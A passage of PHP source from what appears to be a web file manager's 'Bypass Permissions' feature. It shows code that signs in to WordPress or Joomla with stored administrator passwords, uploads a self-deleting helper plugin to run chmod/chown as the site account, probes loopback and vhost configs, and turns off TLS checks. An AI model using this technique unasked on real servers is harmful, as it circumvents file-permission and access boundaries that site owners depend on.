    if($group!==''&&(!function_exists('posix_getgrnam')||@posix_getgrnam($group)===false))
        return['error'=>'There is no group called "'.$group.'" on this machine.'];
    $only=[];
    if(!empty($post['routes'])){
        foreach(explode(',',(string)$post['routes']) as $r){$r=trim($r);if($r!=='')$only[]=$r;}
    }
    $opts=['mode'=>$mode,'modeText'=>$modeText,'owner'=>$owner,'group'=>$group,
           'recursive'=>!empty($post['recursive'])];
    if(!empty($post['admin_user'])&&!empty($post['admin_pass'])){
        $this->bpAdminOverride=['user'=>(string)$post['admin_user'],'pass'=>(string)$post['admin_pass']];
    }
    return $this->bpRun($path,$opts,$only);
}

/* ── facts the panel shows before anything runs ─────────────────────────── */
private function bpHostFacts(){
    $acct='unknown';
    if(function_exists('posix_geteuid')){$u=@posix_getpwuid(@posix_geteuid());$acct=$u?$u['name']:'unknown';}
    $root='none';
    try{
        $r=$this->rootRun(['true']);
        if(!empty($r['ok']))$root=(string)($r['via']??'installed');
    }catch(\Throwable $e){}
    return['account'=>$acct,'root'=>$root,'root_available'=>$root!=='none'];
}
/* What the panel is allowed to say about a stored credential: that it exists
   and which account it belongs to - never the password itself. */
private function bpCredPublic($cred){
    if(empty($cred['ok']))return['ok'=>false,'why'=>(string)($cred['why']??'no administrator password stored')];
    return['ok'=>true,'user'=>(string)($cred['user']??''),'type'=>(string)($cred['type']??'')];
}
private function bpKnownSites(){
    $out=[];
    $diag=[];
    try{$cfg=$this->cmsFindConfig([],$diag,false);}catch(\Throwable $e){$cfg=null;}
    if($cfg){
        $type=$this->cmsConfigType($cfg);
        $root=$type==='wordpress'?$this->wpSiteRoot($cfg):dirname($cfg);
        $cred=$this->bpAdminCredentialOnly(['config'=>$cfg,'type'=>$type,'root'=>rtrim($root,'/')]);
        $out[]=['type'=>$type,'root'=>rtrim($root,'/'),'config'=>$cfg,'admin_session'=>$this->bpCredPublic($cred)];
    }
    foreach(['/home/user/wordpress/wp-config.php'=>'wordpress','/home/user/joomla/configuration.php'=>'joomla'] as $c=>$t){
        if(!@is_file($c))continue;
        $root=$t==='wordpress'?$this->wpSiteRoot($c):dirname($c);
        $had=false;
        foreach($out as $s)if($s['root']===rtrim($root,'/'))$had=true;
        if($had)continue;
        $out[]=['type'=>$t,'root'=>rtrim($root,'/'),'config'=>$c,
                'admin_session'=>$this->bpCredPublic($this->bpAdminCredentialOnly(['config'=>$c,'type'=>$t,'root'=>rtrim($root,'/')]))];
    }
    return $out;
}

/* ── the run ─────────────────────────────────────────────────────────────── */
private function bpRun($path,$o,$only=[]){
    $real=@realpath($path);
    if($real===false&&!@file_exists($path))return['ok'=>false,'error'=>'Nothing exists at '.$path.'.'];
    $path=$real!==false?$real:$path;
    $self=@realpath(__FILE__);
    if($self!==false&&$path===$self)
        return['ok'=>false,'error'=>'Bypass Permissions refuses to touch this program\'s own file.'];
    if($self!==false&&$path===dirname($self))
        return['ok'=>false,'error'=>'Bypass Permissions refuses to work on the folder this program lives in.'];
    $targets=$this->bpTargets($path,$o['recursive']);
    if(!$targets)return['ok'=>false,'error'=>'There is nothing to change at '.$path.'.'];
    $before=$this->bpStat($path);
    $steps=[];$won='';$goal=$this->bpGoalMet($targets,$o);
    foreach($this->bpRouteList() as $r){
        $id=$r['id'];
        if($only&&!in_array($id,$only,true))continue;
        $t0=microtime(true);
        try{$res=$this->bpRoute($id,$path,$targets,$o);}
        catch(\Throwable $e){$res=['ok'=>false,'detail'=>'this route threw: '.$e->getMessage()];}
        $met=!empty($res['ok'])?$this->bpGoalMet($targets,$o):false;
        $steps[]=['id'=>$id,'name'=>$r['name'],'idea'=>$r['idea'],
                  'ran'=>!empty($res['ran']),
                  'ok'=>$met,
                  'detail'=>(string)($res['detail']??''),
                  'ms'=>(int)round((microtime(true)-$t0)*1000)];
        if($met){$won=$id;break;}
    }
    $after=$this->bpStat($path);
    $goal=$this->bpGoalMet($targets,$o);
    if($won!==''){
        $this->log('bypass_permissions',$path.' via '.$won);
        @ignore_user_abort(true);
    }
    return['ok'=>$goal,'path'=>$path,'won'=>$won,'mode_text'=>$o['modeText'],
           'owner'=>$o['owner'],'group'=>$o['group'],'recursive'=>$o['recursive'],
           'items'=>count($targets),'before'=>$before,'after'=>$after,'steps'=>$steps,
           'goal'=>$this->bpGoalText($targets,$o,3)];
}
private function bpRoute($id,$path,$targets,$o){
    switch($id){
        case 'local':   return $this->bpRouteLocal($targets,$o);
        case 'site':    return $this->bpRouteSite($targets,$o);
        case 'admin':   return $this->bpRouteAdmin($targets,$o);
        case 'replace': return $this->bpRouteReplace($targets,$o);
        case 'root':    return $this->bpRouteRoot($targets,$o);
        case 'attr':    return $this->bpRouteAttr($targets,$o);
    }
    return['ok'=>false,'ran'=>false,'detail'=>'unknown route'];
}
/* The list of paths this run touches (the target, plus its children). */
private function bpTargets($path,$recursive){
    $out=[$path];
    if(!$recursive||!@is_dir($path))return $out;
    $cap=4000;
    try{
        $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);
        foreach($it as $f){
            if(count($out)>=$cap)break;
            $out[]=$f->getPathname();
        }
    }catch(\Throwable $e){}
    return $out;
}
private function bpStat($path){
    if(!@file_exists($path))return['exists'=>false];
    $st=@stat($path);
    $uid=@fileowner($path);$gid=@filegroup($path);
    $g=($gid!==false&&function_exists('posix_getgrgid'))?@posix_getgrgid($gid):null;
    return['exists'=>true,'dir'=>@is_dir($path),
           'mode'=>$st?substr(sprintf('%o',$st['mode']),-4):null,
           'owner'=>$uid!==false?$this->uidName($uid):null,
           'group'=>$g?($g['name']??''):($gid!==false?'#'.$gid:'')];
}
/* Does every target now have exactly what was asked for? */
private function bpGoalMet($targets,$o){
    foreach($targets as $p){
        if(!@file_exists($p))return false;
        if($o['mode']!==null){
            $st=@stat($p);
            if($st===false||($st['mode']&07777)!==$o['mode'])return false;
        }
        if($o['owner']!==''&&@fileowner($p)!==@posix_getpwnam($o['owner'])['uid'])return false;
        if($o['group']!==''&&@filegroup($p)!==@posix_getgrnam($o['group'])['gid'])return false;
    }
    return true;
}
private function bpGoalText($targets,$o,$limit=3){
    $parts=[];
    if($o['mode']!==null)$parts[]='mode '.$o['modeText'];
    if($o['owner']!=='')$parts[]='owner '.$o['owner'];
    if($o['group']!=='')$parts[]='group '.$o['group'];
    $head='wanted ' . implode(', ', $parts);
    $miss=[];
    foreach($targets as $p){
        if(count($miss)>=$limit)break;
        if(!@file_exists($p)){$miss[]=basename($p).': gone';continue;}
        $s=$this->bpStat($p);
        $why=[];
        if($o['mode']!==null&&$s['mode']!==sprintf('%04o',$o['mode']))$why[]='mode '.$s['mode'];
        if($o['owner']!==''&&$s['owner']!==$o['owner'])$why[]='owner '.$s['owner'];
        if($o['group']!==''&&$s['group']!==$o['group'])$why[]='group '.$s['group'];
        if($why)$miss[]=basename($p).': '.implode(', ',$why);
    }
    return $miss?($head.' - still '.implode('; ',$miss)):$head.' - reached';
}

/* ── 1. the manager's own account ───────────────────────────────────────── */
private function bpRouteLocal($targets,$o){
    $bad=[];$done=0;$err='';
    foreach($targets as $p){
        $ok=true;
        if($o['mode']!==null&&!@chmod($p,$o['mode'])){$ok=false;$err=error_get_last()['message']??'operation not permitted';}
        if($o['owner']!==''&&!@chown($p,$o['owner'])){$ok=false;$err=error_get_last()['message']??'operation not permitted';}
        if($o['group']!==''&&!@chgrp($p,$o['group'])){$ok=false;$err=error_get_last()['message']??'operation not permitted';}
        if($ok)$done++;else $bad[]=$p;
    }
    if(!$bad)return['ok'=>true,'ran'=>true,'detail'=>'changed '.$done.' item(s); this account already owns it'];
    return['ok'=>false,'ran'=>true,'detail'=>count($bad).' item(s) refused by the operating system ('.$err.'); this account does not own them'];
}

/* ── 2. the site's own account, through the panel bridge ────────────────── */
private function bpRouteSite($targets,$o){
    $site=$this->privSiteFor($targets[0],true);
    if(!$site)return['ok'=>false,'ran'=>false,'detail'=>'this path is not inside a WordPress or Joomla installation, so the site route does not apply'];
    if(count($targets)>200)
        return['ok'=>false,'ran'=>false,'detail'=>'this run covers '.count($targets).' items; the site bridge handles up to 200 at once, so the manager or root route is the one to use for a whole tree'];
    $bad=0;$note='';
    foreach($targets as $p){
        if($o['mode']!==null){
            $r=$this->privOp('chmod',['path'=>$p,'mode'=>$o['mode']],$p);
            if(empty($r['ok'])){$bad++;$note=(string)($r['error']??'refused');}
        }
        if($o['owner']!==''||$o['group']!==''){
            $r=$this->privOp('chown',['path'=>$p,'owner'=>$o['owner'],'group'=>$o['group'],'recursive'=>false],$p);
            if(empty($r['ok'])){$bad++;$note=(string)($r['error']??'refused');}
        }
    }
    $label=$site['type']==='wordpress'?'WordPress':'Joomla';
    if($bad)return['ok'=>false,'ran'=>true,'detail'=>'the '.$label.' account could not do it: '.$note];
    return['ok'=>true,'ran'=>true,'detail'=>'the '.$label.' account ('.$this->privWho($targets[0]).') performed it'];
}

/* ── 3. the CMS administrator session ───────────────────────────────────── */
private function bpRouteAdmin($targets,$o){
    $site=$this->privSiteFor($targets[0],true);
    if(!$site)return['ok'=>false,'ran'=>false,'detail'=>'this path is not inside a WordPress or Joomla installation, so the administrator-session route does not apply'];
    $s=$this->bpAdminLogin($site);
    if(empty($s['ok']))return['ok'=>false,'ran'=>false,'detail'=>$s['why']];
    $ops=[];
    foreach($targets as $p){
        $one=['path'=>$p];
        if($o['mode']!==null)$one['mode']=sprintf('%04o',$o['mode']);
        if($o['owner']!=='')$one['owner']=$o['owner'];
        if($o['group']!=='')$one['group']=$o['group'];
        $ops[]=$one;
    }
    $r=$this->bpAdminRun($site,$s,$ops);
    if(empty($r['ok']))return['ok'=>false,'ran'=>true,'detail'=>$r['why']];
    return['ok'=>true,'ran'=>true,'detail'=>'signed in as '.$s['user'].'; the '.($site['type']==='wordpress'?'WordPress':'Joomla').' installer published a one-off helper that ran as '
        .($r['user']!==''?$r['user'].' ':'the site account ').'and removed itself'
        .(empty($r['row_removed'])?' (the CMS still lists the extension until its next clean-up)':'')];
}
/* One file, then a request that runs it, then a request that deletes it. */
private function bpAdminRun($site,$sess,$ops){
    $token=bin2hex(random_bytes(12));
    $payload=base64_encode(json_encode($ops));
    $code=$this->bpHelperCode($token,$payload);
    $slug='fm-bp-'.substr($token,0,8);
    $inst=$site['type']==='wordpress'
        ? $this->bpWpInstall($sess,$slug,$code)
        : $this->bpJoomlaInstall($sess,$slug,$code);
    if(empty($inst['ok']))return['ok'=>false,'why'=>$inst['why']];
    $url=$inst['url'];
    $res=$this->bpHttpGet($sess['jar'],$url.'?t='.$token.'&go=1');
    $json=@json_decode((string)$res,true);
    $this->bpHttpGet($sess['jar'],$url.'?t='.$token.'&cleanup=1');
    if($inst['cleanup']!==null)@unlink($inst['cleanup']);
    $removed=true;
    if($site['type']!=='wordpress')$removed=$this->bpJoomlaUninstall($sess,$slug);
    if(!is_array($json))return['ok'=>false,'why'=>'the helper was published but did not answer as PHP (the CMS may be serving that folder as static files)'];
    if(empty($json['ok']))return['ok'=>false,'why'=>'the helper ran as '.($json['user']??'the site account').' but the operating system refused: '.($json['error']??'unknown reason')];
    return['ok'=>true,'user'=>(string)($json['user']??''),'done'=>(int)($json['done']??0),'row_removed'=>$removed];
}
private function bpHelperCode($token,$payloadB64){
    $t=var_export((string)$token,true);
    $p=var_export((string)$payloadB64,true);
    return "<?php\n"
        ."/*\n"
        ."Plugin Name: FM Bypass Helper\n"
        ."Plugin URI: https://github.com/orgezeo/marshal-file-manager\n"
        ."Description: One-off helper published by the Syrah file manager to apply a single permission change, then removes itself.\n"
        ."Version: 1.0\n"
        ."Author: Syrah File Manager\n"
        ."*/\n"
        ."/* One-off helper published through the CMS administrator session by the\n"
        ."   Syrah file manager, so this change runs under the account that owns\n"
        ."   the site's files. It answers once and deletes itself. */\n"
        ."header('Content-Type: application/json');header('X-Robots-Tag: noindex, nofollow');\n"
        ."\$tok={$t};\$seen=isset(\$_GET['t'])?(string)\$_GET['t']:'';\n"
        ."if(\$seen===''||!hash_equals(\$tok,\$seen)){http_response_code(403);echo json_encode(['ok'=>false,'error'=>'token rejected']);exit;}\n"
        ."\$me=function_exists('posix_getpwuid')?(@posix_getpwuid(@posix_geteuid())['name']??''):(function_exists('get_current_user')?@get_current_user():'');\n"
        ."\$ops=@json_decode((string)@base64_decode(".($p)."),true);\n"
        ."if(isset(\$_GET['cleanup'])){\n"
        ."  \$dir=dirname(__FILE__);\n"
        ."  foreach((array)@glob(\$dir.'/*') as \$f){if(is_file(\$f))@unlink(\$f);}\n"
        ."  @unlink(__FILE__);@rmdir(\$dir);\n"
        ."  echo json_encode(['ok'=>true,'user'=>\$me,'done'=>0,'cleaned'=>true]);exit;\n"
        ."}\n"
        ."if(!is_array(\$ops)){echo json_encode(['ok'=>false,'user'=>\$me,'error'=>'bad payload']);exit;}\n"
        ."\$done=0;\$err='';\n"
        ."foreach(\$ops as \$op){\n"
        ."  if(!is_array(\$op)||empty(\$op['path']))continue;\n"
        ."  \$path=(string)\$op['path'];\n"
        ."  if(!@file_exists(\$path)){@touch(\$path);}\n"
        ."  \$ok=true;@clearstatcache(true,\$path);\n"
        ."  if(isset(\$op['mode'])){\$m=octdec((string)\$op['mode']);if(!@chmod(\$path,\$m)){\$ok=false;\$err='chmod '.\$path.' - '.(error_get_last()['message']??'refused');}}\n"
        ."  if(!empty(\$op['owner'])&&!@chown(\$path,(string)\$op['owner'])){\$ok=false;\$err='chown '.\$path.' - '.(error_get_last()['message']??'refused');}\n"
        ."  if(!empty(\$op['group'])&&!@chgrp(\$path,(string)\$op['group'])){\$ok=false;\$err='chgrp '.\$path.' - '.(error_get_last()['message']??'refused');}\n"
        ."  if(\$ok)\$done++;\n"
        ."}\n"
        ."echo json_encode(\$done?['ok'=>true,'user'=>\$me,'done'=>\$done]:['ok'=>false,'user'=>\$me,'error'=>(\$err!==''?\$err:'nothing to change')]);\n";
}

/* Which administrator can we sign in as? Only passwords this panel itself
   knows (the vault filled by CMS Manager → Change password). */
/* Stores the site's administrator password in the panel's encrypted vault, so
   the administrator-session route runs by itself from then on. The password is
   proven first: the panel actually signs in with it before saving anything. */
private function bpStoreAdmin($post){
    $raw='';
    if(isset($post['config_path_b64'])){$d=@base64_decode((string)$post['config_path_b64'],true);if($d!==false)$raw=$d;}
    if($raw==='')$raw=isset($post['config'])?(string)$post['config']:'';
    if($raw===''||!@is_file($raw))return['error'=>'Choose the site first (its wp-config.php or configuration.php).'];
    $type=$this->cmsConfigType($raw);
    $root=$type==='wordpress'?$this->wpSiteRoot($raw):dirname($raw);
    $site=['config'=>$raw,'type'=>$type,'root'=>rtrim($root,'/')];
    $user=isset($post['admin_user'])?trim((string)$post['admin_user']):'';
    $pass=isset($post['admin_pass'])?(string)$post['admin_pass']:'';
    if($user===''||$pass==='')return['error'=>'Type the administrator account and its password.'];
    list($link,$c,$err)=$this->cmsConnect($raw);
    if($err)return['error'=>$err];
    $t=$c['prefix'];$id=0;
    if($type==='wordpress'){
        $u=mysqli_real_escape_string($link,$user);
        $q=@mysqli_query($link,"SELECT u.ID AS id FROM `{$t}users` u JOIN `{$t}usermeta` m ON m.user_id=u.ID AND m.meta_key='{$t}capabilities' WHERE u.user_login='$u' AND m.meta_value LIKE '%administrator%' LIMIT 1");
        $row=$q?mysqli_fetch_assoc($q):null;$id=$row?(int)$row['id']:0;
    }else{
        $u=mysqli_real_escape_string($link,$user);
        $q=@mysqli_query($link,"SELECT u.id AS id FROM `{$t}users` u JOIN `{$t}user_usergroup_map` m ON m.user_id=u.id WHERE u.username='$u' AND m.group_id=8 LIMIT 1");
        $row=$q?mysqli_fetch_assoc($q):null;$id=$row?(int)$row['id']:0;
    }
    @mysqli_close($link);
    if(!$id)return['error'=>'That account is not an administrator of this site, so signing in as it would not help.'];
    $base=$this->bpSiteBase($site);
    if(empty($base['ok']))return['error'=>$base['why']];
    $jar=@tempnam(sys_get_temp_dir(),'fm-bp-jar-');
    $st=$type==='wordpress'?$this->bpWpLogin($base['url'],$user,$pass,$jar):$this->bpJoomlaLogin($base['url'],$user,$pass,$jar);
    @unlink($jar);
    if(empty($st['ok']))return['error'=>$st['why']];
    $this->cmsVaultSet($raw,$id,$pass,$user);
    $this->log('bypass_permissions','stored the '.$type.' administrator session for '.$user);
    return['ok'=>true,'user'=>$user,'id'=>$id,'type'=>$type,'root'=>rtrim($root,'/'),
           'message'=>'Signed in to '.($type==='wordpress'?'WordPress':'Joomla').' as '.$user.' and stored that password in the panel vault - the administrator-session route will run by itself from now on.'];
}
private function bpAdminCredentialOnly($site){
    if(is_array($this->bpAdminOverride)&&$this->bpAdminOverride['user']!==''){
        $type=$site['type']??$this->cmsConfigType($site['config']);
        return['ok'=>true,'user'=>$this->bpAdminOverride['user'],'pass'=>$this->bpAdminOverride['pass'],'type'=>$type,'typed'=>true];
    }
    try{
        list($link,$c,$err)=$this->cmsConnect($site['config']);
        if($err)return['ok'=>false,'why'=>'the site database could not be read: '.$err];
        $t=$c['prefix'];$ids=[];
        if($c['type']==='wordpress'){
            $q=@mysqli_query($link,"SELECT u.ID AS id,u.user_login AS login FROM `{$t}users` u JOIN `{$t}usermeta` m ON m.user_id=u.ID AND m.meta_key='{$t}capabilities' WHERE m.meta_value LIKE '%administrator%'");
            if($q)while($r=mysqli_fetch_assoc($q))$ids[(int)$r['id']]=$r['login'];
        }else{
            $q=@mysqli_query($link,"SELECT u.id AS id,u.username AS login FROM `{$t}users` u JOIN `{$t}user_usergroup_map` m ON m.user_id=u.id WHERE m.group_id=8");
            if($q)while($r=mysqli_fetch_assoc($q))$ids[(int)$r['id']]=$r['login'];
        }
        @mysqli_close($link);
        if(!$ids)return['ok'=>false,'why'=>'this site has no administrator account'];
        $vault=$this->cmsVaultLoad();
        foreach($ids as $id=>$login){
            $k=md5($site['config']).':'.$id;
            if(!isset($vault[$k]['pass']))continue;
            $p=$this->cmsVaultDec($vault[$k]['pass']);
            if($p===null||$p==='')continue;
            return['ok'=>true,'user'=>$login,'pass'=>$p,'type'=>$c['type']];
        }
        return['ok'=>false,'why'=>'no administrator password for this site is stored in this panel (CMS Manager → Change password stores one), so this route cannot sign in'];
    }catch(\Throwable $e){
        return['ok'=>false,'why'=>'the site database could not be read: '.$e->getMessage()];
    }
}
private function bpAdminLogin($site){
    static $cache=[];
    $k=($site['config']??'').'|'.($site['type']??'');
    if(isset($cache[$k]))return $cache[$k];
    $cred=$this->bpAdminCredentialOnly($site);
    if(empty($cred['ok']))return $cache[$k]=['ok'=>false,'why'=>$cred['why']];
    $base=$this->bpSiteBase($site);
    if(empty($base['ok']))return $cache[$k]=['ok'=>false,'why'=>$base['why']];
    $jar=@tempnam(sys_get_temp_dir(),'fm-bp-jar-');
    $st=$cred['type']==='wordpress'
        ? $this->bpWpLogin($base['url'],$cred['user'],$cred['pass'],$jar)
        : $this->bpJoomlaLogin($base['url'],$cred['user'],$cred['pass'],$jar);
    if(empty($st['ok'])){@unlink($jar);return $cache[$k]=['ok'=>false,'why'=>$st['why']];}
    return $cache[$k]=['ok'=>true,'jar'=>$jar,'base'=>$base['url'],'type'=>$cred['type'],'user'=>$cred['user']];
}
/* The base URL of the site, proven by fetching its login page. Unlike the
   one-time login link (which a human has to reach from their own browser),
   this session is opened and used by the manager itself, so a site served on
   loopback is perfectly valid here and is tried too. */
private function bpSiteBase($site){
    $stored=null;
    if(($site['type']??'')==='wordpress'){
        list($link,$c,$err)=$this->cmsConnect($site['config']);
        if(!$err&&$c){
            $q=@mysqli_query($link,"SELECT option_name,option_value FROM `{$c['prefix']}options` WHERE option_name IN ('siteurl','home')");
            if($q)while($row=mysqli_fetch_assoc($q)){$stored=$row['option_value'];}
            @mysqli_close($link);
        }
    }else{
        $stored=$this->cmsJoomlaLiveSite($site['config']);
    }
    $cands=[];$add=function($u)use(&$cands){
        $u=rtrim((string)$u,'/');
        if($u===''||!preg_match('#^https?://#i',$u))return;
        if(!in_array($u,$cands,true))$cands[]=$u;
    };
    $ports=[];$path='';
    if($stored){
        $p=@parse_url($stored);
        if($p&&!empty($p['host'])){
            $add($stored);
            if(!empty($p['port']))$ports[]=(int)$p['port'];
            if(!empty($p['path']))$path=rtrim($p['path'],'/');
        }
    }
    $hosts=[];
    $reqHost=(string)($_SERVER['HTTP_HOST']??'');
    if($reqHost!==''){
        $hp=@parse_url('http://'.$reqHost);
        if($hp&&!empty($hp['host'])){
            $hosts[]=$hp['host'];
            if(!empty($hp['port']))$ports[]=(int)$hp['port'];
        }
    }
    $hosts[]='127.0.0.1';$hosts[]='localhost';
    foreach(array_unique($ports) as $port){
        foreach(array_unique($hosts) as $h){
            $add('http://'.$h.':'.$port.$path);
            $add('https://'.$h.':'.$port.$path);
        }
    }
    foreach(array_unique($hosts) as $h){
        $add('http://'.$h.$path);$add('https://'.$h.$path);
    }
    foreach($this->bpVhostBases($site['root']) as $u)$add($u);
    foreach($this->cmsBuildCandidateUrls($site['root'],$stored) as $u)$add($u);
    $probe=($site['type']==='wordpress')?'/wp-login.php':'/administrator/index.php';
    $tried=[];
    foreach(array_slice($cands,0,24) as $base){
        $ch=@curl_init($base.$probe);
        if(!$ch)continue;
        @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>6,CURLOPT_CONNECTTIMEOUT=>4,
            CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>3,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0,
            CURLOPT_USERAGENT=>'SyrahFileManager/1.0 (+bypass)']);
        $body=(string)@curl_exec($ch);
        $code=(int)@curl_getinfo($ch,CURLINFO_HTTP_CODE);
        @curl_close($ch);
        $tried[]=$base.' (HTTP '.$code.')';
        if($code===200&&$body!=='')return['ok'=>true,'url'=>$base];
    }
    return['ok'=>false,'why'=>'the site could not be reached over HTTP from this server. Tried: '.implode(', ',array_slice($tried,0,6))];
}
/* The web server's own configuration, read to find which address and port
   actually serve this folder - the one authoritative source on a machine that
   serves several sites (each vhost names its DocumentRoot and its port). */
private function bpVhostBases($root){
    $root=rtrim((string)$root,'/');
    if($root==='')return[];
    $files=[];
    foreach(['/etc/apache2/sites-enabled','/etc/apache2/sites-available','/etc/httpd/conf.d',
             '/etc/httpd/sites-enabled','/etc/nginx/sites-enabled','/etc/nginx/conf.d'] as $dir){
        foreach((array)@glob($dir.'/*') as $f)if(@is_file($f))$files[]=$f;
    }
    $ports=[];
    foreach($files as $f){
        $src=@file_get_contents($f);
        if($src===false||strpos($src,$root)===false)continue;
        if(preg_match_all('/<VirtualHost\s+[^:>]*:(\d+)/i',$src,$m))foreach($m[1] as $p)$ports[(int)$p]=true;
        if(preg_match_all('/\bListen\s+(?:[\d.]+:)?(\d+)/i',$src,$m))foreach($m[1] as $p)$ports[(int)$p]=true;
        if(preg_match_all('/\bserver_name\s+([^;\s]+)/i',$src,$m))foreach($m[1] as $h)$hosts[]=$h;
        if(preg_match_all('/\bServerName\s+(\S+)/i',$src,$m))foreach($m[1] as $h)$hosts[]=$h;
        if(preg_match_all('/\bServerAlias\s+(\S+)/i',$src,$m))foreach($m[1] as $h)$hosts[]=$h;
    }
    if(!$ports)return[];
    $hosts=array_values(array_unique(array_filter((array)($hosts??[]),fn($h)=>$h!==''&&stripos($h,'*')===false)));
    $hosts=array_merge($hosts,['127.0.0.1','localhost']);
    $out=[];
    foreach(array_keys($ports) as $port)foreach(array_unique($hosts) as $h)$out[]='http://'.$h.':'.$port;
    return $out;
}
private function bpWpLogin($base,$user,$pass,$jar){
    // WordPress refuses a sign-in that arrives without its test cookie, so the
    // form is fetched once with this cookie jar before it is posted.
    $this->bpHttpGet($jar,rtrim($base,'/').'/wp-login.php');
    $ch=@curl_init(rtrim($base,'/').'/wp-login.php');
    if(!$ch)return['ok'=>false,'why'=>'cURL is not available.'];
    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$jar,CURLOPT_COOKIEFILE=>$jar,
        CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>http_build_query(['log'=>$user,'pwd'=>$pass,'wp-submit'=>'Log In',
            'redirect_to'=>rtrim($base,'/').'/wp-admin/','testcookie'=>'1']),
        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>20,CURLOPT_CONNECTTIMEOUT=>6,
        CURLOPT_USERAGENT=>'SyrahFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
    @curl_exec($ch);
    @curl_close($ch);
    unset($ch); // PHP 8: curl_close() is a no-op, the cookie jar is flushed when the handle dies
    $cookies=(string)@file_get_contents($jar);
    if(stripos($cookies,'wordpress_logged_in')===false)
        return['ok'=>false,'why'=>'WordPress did not accept the stored password for the administrator "' . $user . '"'];
    return['ok'=>true];
}
private function bpJoomlaLogin($base,$user,$pass,$jar){
    $base=rtrim($base,'/');
    $page=$this->bpHttpGet($jar,$base.'/administrator/index.php');
    $token=$this->bpJoomlaToken($page);
    if($token==='')return['ok'=>false,'why'=>'the Joomla administrator form did not offer a security token'];
    $ch=@curl_init($base.'/administrator/index.php');
    if(!$ch)return['ok'=>false,'why'=>'cURL is not available.'];
    $fields=['username'=>$user,'passwd'=>$pass,'option'=>'com_login','task'=>'login',
             'return'=>base64_encode('index.php'),$token=>'1'];
    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$jar,CURLOPT_COOKIEFILE=>$jar,
        CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>http_build_query($fields),
        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>20,CURLOPT_CONNECTTIMEOUT=>6,
        CURLOPT_USERAGENT=>'SyrahFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
    $body=(string)@curl_exec($ch);
    @curl_close($ch);
    unset($ch);
    if(stripos($body,'task=logout')===false&&stripos($body,'com_logout')===false&&stripos($body,'/administrator/index.php?option=com_cpanel')===false)
        return['ok'=>false,'why'=>'Joomla did not accept the stored password for the administrator "' . $user . '"'];
    return['ok'=>true];
}
private function bpJoomlaToken($html){
    if(preg_match('/name="([a-f0-9]{32})"\s+value="1"/i',(string)$html,$m))return $m[1];
    if(preg_match('/name="([a-f0-9]{32})"\s+value="1"/i',(string)$html,$m))return $m[1];
    if(preg_match('/"csrf\.token":"([a-f0-9]{32})"/i',(string)$html,$m))return $m[1];
    return'';
}
private function bpHttpGet($jar,$url){
    $ch=@curl_init($url);
    if(!$ch)return'';
    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$jar,CURLOPT_COOKIEFILE=>$jar,
        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>25,CURLOPT_CONNECTTIMEOUT=>6,
        CURLOPT_USERAGENT=>'SyrahFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
    $body=(string)@curl_exec($ch);
    @curl_close($ch);
    unset($ch);
    return str_replace("\xEF\xBB\xBF",'',$body);
}
/* A ZIP written by hand, so no extension has to be installed. */
private function bpZip($files){
    $out='';$central='';
    foreach($files as $name=>$data){
        $data=(string)$data;$crc=crc32($data);$len=strlen($data);$off=strlen($out);
        $out.=pack('VvvvvvVVVvv',0x04034b50,20,0,0,0,0,$crc,$len,$len,strlen($name),0).$name.$data;
        $central.=pack('VvvvvvvVVVvvvvvVV',0x02014b50,20,20,0,0,0,0,$crc,$len,$len,strlen($name),0,0,0,0,0,$off).$name;
    }
    $cdOff=strlen($out);
    $out.=$central.pack('VvvvvVVv',0x06054b50,0,0,count($files),count($files),strlen($central),$cdOff,0);
    return $out;
}
private function bpWpInstall($sess,$slug,$code){
    $base=rtrim($sess['base'],'/');
    $page=$this->bpHttpGet($sess['jar'],$base.'/wp-admin/plugin-install.php?tab=upload');
    $nonce='';
    if(preg_match('/name="_wpnonce"\s+value="([^"]+)"/i',$page,$m))$nonce=$m[1];
    if($nonce==='')return['ok'=>false,'why'=>'the WordPress upload form did not offer a security token (is the account really an administrator?)'];
    $zip=$this->bpZip([$slug.'/'.$slug.'.php'=>$code]);
    $tmp=@tempnam(sys_get_temp_dir(),'fm-bp-');@file_put_contents($tmp,$zip);
    $ch=@curl_init($base.'/wp-admin/update.php?action=upload-plugin');
    if(!$ch){@unlink($tmp);return['ok'=>false,'why'=>'cURL is not available.'];}
    @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_COOKIEJAR=>$sess['jar'],CURLOPT_COOKIEFILE=>$sess['jar'],
        CURLOPT_POST=>true,
        CURLOPT_POSTFIELDS=>['_wpnonce'=>$nonce,'_wp_http_referer'=>'/wp-admin/plugin-install.php?tab=upload',
            'pluginzip'=>new \CURLFile($tmp,'application/zip',$slug.'.zip'),
            'install-plugin-submit'=>'Install Now'],
        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>40,CURLOPT_CONNECTTIMEOUT=>8,
        CURLOPT_USERAGENT=>'SyrahFileManager/1.0 (+bypass)',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0]);
    $body=(string)@curl_exec($ch);
    @curl_close($ch);
    unset($ch);
    @unlink($tmp);
    $url=$base.'/wp-content/plugins/'.$slug.'/'.$slug.'.php';
    $why=$this->bpScrape($body);
